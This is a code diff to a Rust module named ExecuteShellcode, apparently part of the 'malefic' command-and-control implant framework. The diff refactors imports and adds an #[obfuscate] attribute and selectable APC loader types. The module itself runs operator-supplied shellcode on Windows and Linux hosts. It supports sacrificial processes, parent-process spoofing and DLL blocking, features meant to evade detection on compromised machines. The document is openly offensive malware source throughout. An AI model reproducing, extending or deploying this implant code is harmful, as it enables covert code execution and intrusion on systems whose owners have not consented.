@@ -1,7 +1,10 @@
 #![allow(unused_assignments)]
-use malefic_helper::common::utils::format_cmdline;
-use malefic_proto::proto::modulepb::BinaryResponse;
 use crate::prelude::*;
+use malefic_common::utils::format_cmdline;
+use malefic_proto::proto::modulepb::BinaryResponse;
+
+#[cfg(target_os = "windows")]
+use malefic_loader::win::apc::LoaderType;
 
 pub struct ExecuteShellcode {}
 
@@ -10,14 +13,14 @@ pub struct ExecuteShellcode {}
 impl Module for ExecuteShellcode {}
 
 #[async_trait]
-impl malefic_proto::module::ModuleImpl for ExecuteShellcode {
-
+#[obfuscate]
+impl malefic_module::ModuleImpl for ExecuteShellcode {
     #[allow(unused_variables)]
     async fn run(
         &mut self,
         id: u32,
-        receiver: &mut malefic_proto::module::Input,
-        sender: &mut malefic_proto::module::Output,
+        receiver: &mut malefic_module::Input,
+        sender: &mut malefic_module::Output,
     ) -> ModuleResult {
         let request = check_request!(receiver, Body::ExecuteBinary)?;
         let bin = request.bin;
@@ -29,7 +32,12 @@ impl malefic_proto::module::ModuleImpl for ExecuteShellcode {
         let mut is_block_dll = false;
         let mut ret: Vec<u8> = Vec::new();
         let cmdline = format_cmdline(process_name, params);
-        
+
+        #[cfg(target_os = "windows")]
+        let loader_type = LoaderType::from_str(&request.r#type);
+
+        #[cfg(target_os = "windows")]
+        debug!("loader_type: {:?}", loader_type);
         unsafe {
             if sacrifice.is_some() {
                 let sacrifice = sacrifice.unwrap();
@@ -39,30 +47,30 @@ impl malefic_proto::module::ModuleImpl for ExecuteShellcode {
             }
             #[cfg(target_os = "windows")]
             {
-                ret = to_error!(malefic_helper::win::loader::loader(
+                ret = to_error!(malefic_loader::win::loader(
                     bin,
                     is_need_sacrifice,
                     cmdline.as_ptr() as _,
                     ppid,
                     is_block_dll,
-                    request.output
+                    request.output,
+                    loader_type as u32
                 ))?;
             }
             #[cfg(target_os = "linux")]
             {
-                ret = to_error!(malefic_helper::linux::loader::loader(
-                    bin,
-                    request.output
-                ))?;
+                ret = to_error!(malefic_loader::linux::loader(bin, request.output))?;
             }
         }
 
-        Ok(TaskResult::new_with_body(id, Body::BinaryResponse(BinaryResponse{
-            status: 0,
-            message: Vec::new(),
-            data: ret,
-            err: "".to_string(),
-        })))
+        Ok(TaskResult::new_with_body(
+            id,
+            Body::BinaryResponse(BinaryResponse {
+                status: 0,
+                message: Vec::new(),
+                data: ret,
+                err: "".to_string(),
+            }),
+        ))
     }
-
 }
